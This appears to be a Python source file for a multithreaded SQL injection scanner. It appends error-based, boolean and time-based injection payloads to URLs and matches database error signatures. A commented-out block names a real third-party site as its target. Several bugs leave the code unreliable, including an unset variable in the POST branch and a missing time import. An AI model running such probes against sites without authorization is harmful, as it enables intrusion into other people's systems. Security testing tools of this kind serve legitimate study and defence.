import re, random
import threading
import queue
from src.lib.core import Download
# from src.lib.utils.FileUtils import *
from src.lib.utils.FileUtils import *
import logging

# sql_rule = "/Users/looperX/python/security/src/data/filter_sql_rule.txt"
sql_rule_xml = "/Users/looperX/python/security/src/data/filter_sql_rule.xml"
explicit_rule_xml = "/Users/looperX/Devlop/python/src/data/explicit_injection.xml"
time_explicit_xml = "/Users/looperX/Devlop/python/src/data/time_injection.xml"
msg_queue = queue.Queue()

logging.basicConfig(
                    # filename='log/logger.log',
                    level=logging.INFO,
                    format='%(asctime)s [%(levelname)s] %(message)s',
)


class SqlCheck(object):

    def __init__(self, target_dict):
        self.threads = []
        self.thread_num = 10
        self.target_dict = target_dict
        self.explicit_payloads = FileUtils.parse(explicit_rule_xml)
        self.tim = FileUtils.parse(explicit_rule_xml)
        self.time_payloads = FileUtils.parse(time_explicit_xml)
        # pass

    # test explicit sql injection
    def judge_is_explicit_injection_url(self, url, method, data):
        Downloader = Download.Downloader()
        DBMS_ERRORS = {  # regular expressions used for DBMS recognition based on error message response
            "error info": (r"error", r"select", r"query"),
            "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
            "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
            "Microsoft SQL Server": (
                r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver",
                r"Warning.*mssql_.*",
                r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
                r"(?s)Exception.*\WRoadhouse\.Cms\."),
            "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
            "Oracle": (
                r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*",
                r"Warning.*\Wora_.*"),
            "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
            "SQLite": (
                r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*",
                r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
            "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
        }
        # explicit_payload = FileUtils.parse(explicit_rule_xml)
        # global explicit_payloads
        for payload in self.explicit_payloads:
            if method == 'GET':
                target_url = url + ' ' + payload
                _content = Downloader.get(target_url)
                logging.info('loading target_url use explicit injection by get method: ' + target_url)
            else:
                _content = Downloader.post(target_url, data)
                logging.info('loading target_url use explicit injection by post method: ' + target_url)
            for (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]):
                if (re.search(regex, _content)):
                    info = "sql fonud is explicit injection': " + target_url + ' and exit explicit_payloads '
                    logging.warning(info)
                    # FileUtils.write_file("result.txt", info)
                    # print(info)
                    return True

    # # test boolean sql injection
    def bool_injection(self, url, method):
        Downloader = Download.Downloader()
        BOOLEAN_TESTS = (" AND %d=%d", " OR NOT (%d=%d)")
        content = {}
        content["origin"] = Downloader.get(url)

        for test_payload in BOOLEAN_TESTS:
            RANDINT = random.randint(1, 255)
            _url = url + test_payload % (RANDINT, RANDINT)
            content["true"] = Downloader.get(_url)

            _url = url + test_payload % (RANDINT, RANDINT + 1)
            content["false"] = Downloader.get(_url)

            if content["true"] != content["false"]:
                info = "sql fonud: " + _url
                file = "result.txt"
                # FileUtils.write_file(file, info)
                print(info)
                return
                # return True
        return False

    def time_injection(self, url, method, data):
        Downloader = Download.Downloader()
        start_time = time.time()
        # payloads = FileUtils.parse("/Users/looperX/python/security/test/payloads.xml")
        # time_payloads = FileUtils.parse(time_explicit_xml)
        for payload in self.time_payloads:
            target_url = url + ' ' + payload
            if method == 'GET':
                logging.info('loading target_url by get method: ' + target_url)
                Downloader.get(target_url)
            else:
                logging.info('loading target_url using time injection by post method: ' + target_url)
                Downloader.post(target_url, data)
            end_time = time.time()
            spend_time = end_time - start_time
            if spend_time > 5:
                logging.warning("sql fonud: " + target_url + ' is time_based injection and exit time_based injection')
                return True
        logging.info('target url ' + url + 'not found')

    def put_url_into_queue(self):
        # url, method = target_dict['url'], target_dict['method']
        global msg_queue
        msg_queue.put(self.target_dict)
        # logging("put url to queue...")
        print("put url to queue...")
        # return False

    def worker(self):
        while not msg_queue.empty():
            target = msg_queue.get()
            logging.info("get target url from queue...")
            target_url = target['url']
            target_method = target['method']
            target_data = target['request_content']
            # logging.info()
            # result = self.judge_is_explicit_injection_url(target_url)
            if True == self.judge_is_explicit_injection_url(target_url, target_method, target_data):
                logging.info('done explicit injection target url: ' + target_url)
                msg_queue.task_done()
                return
            # elif self.bool_injection(target_url, target_method) == True:
            #     msg_queue.task_done()
                # return
            elif self.time_injection(target_url, target_method, target_data) == True:
                    # self.sleep_injection()
                    logging.info('done time injection target url: ' + target_url)
                    msg_queue.task_done()
                    return
            # time.sleep(1)
            msg_queue.task_done()
            if msg_queue.empty():
                logging.info('done target url: ' + target_url)

    # multithread version
    def run(self):
        # global msg_ queue
        start_time = time.time()
        for i in range(self.thread_num):
            thread = threading.Thread(target=self.worker)
            thread.start()
            self.threads.append(thread)
        for thread in self.threads:
            thread.join()

        msg_queue.join()
        end_time = time.time()
        spend_time = end_time - start_time
        print(spend_time)
        logging.info("queue is empty and spend time:" + str(spend_time))

# file = "result.txt"
# url = "http://www.hncapitalwater.cn/news.php?lm=11"
# if __name__ == '__main__':
#     FileUtils.clear_file(file)
#     checker = SqlCheck
#     checker.put_url_into_queue(target_dict=xxx)
#     checker.run()
#     # FileUtils.close(file)
